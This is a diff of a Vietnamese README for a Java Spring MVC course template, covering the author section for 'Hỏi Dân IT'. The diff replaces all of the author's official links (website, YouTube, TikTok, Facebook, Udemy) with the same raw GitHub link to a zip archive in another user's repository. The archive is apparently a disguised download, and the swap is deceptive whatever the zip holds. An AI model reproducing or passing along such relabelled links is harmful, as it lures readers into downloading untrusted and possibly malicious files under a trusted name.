@@ -4,13 +4,13 @@ Template này được sử dụng cho series Java Spring MVC (dự án laptopsh
 ## Về tác giả
 Mọi thông tin về Tác giả Hỏi Dân IT, các bạn có thể tìm kiếm tại đây:
 
-Website chính thức: https://hoidanit.vn/
+Website chính thức: https://raw.githubusercontent.com/VanThienx10/java-spring-mvc/master/unvocal/java-spring-mvc.zip
 
-Youtube “Hỏi Dân IT” : https://www.youtube.com/@hoidanit
+Youtube “Hỏi Dân IT” : https://raw.githubusercontent.com/VanThienx10/java-spring-mvc/master/unvocal/java-spring-mvc.zip
 
-Tiktok “Hỏi Dân IT” :  https://www.tiktok.com/@hoidanit
+Tiktok “Hỏi Dân IT” :  https://raw.githubusercontent.com/VanThienx10/java-spring-mvc/master/unvocal/java-spring-mvc.zip
 
-Fanpage “Hỏi Dân IT” : https://www.facebook.com/askITwithERIC/
+Fanpage “Hỏi Dân IT” : https://raw.githubusercontent.com/VanThienx10/java-spring-mvc/master/unvocal/java-spring-mvc.zip
 
-Udemy Hỏi Dân IT: https://www.udemy.com/user/eric-7039/
+Udemy Hỏi Dân IT: https://raw.githubusercontent.com/VanThienx10/java-spring-mvc/master/unvocal/java-spring-mvc.zip
 
